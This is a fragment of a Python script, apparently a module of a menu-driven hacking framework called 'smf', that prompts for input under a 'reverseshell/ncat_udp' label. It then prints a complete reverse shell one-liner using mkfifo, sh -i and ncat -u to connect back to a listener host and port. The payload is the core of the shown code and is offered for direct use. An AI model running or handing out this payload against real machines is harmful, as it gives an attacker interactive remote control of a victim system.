...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/ncat_udp\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/ncat_udp\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {LHOST} {LPORT} >/tmp/f
""")
time.sleep(3)
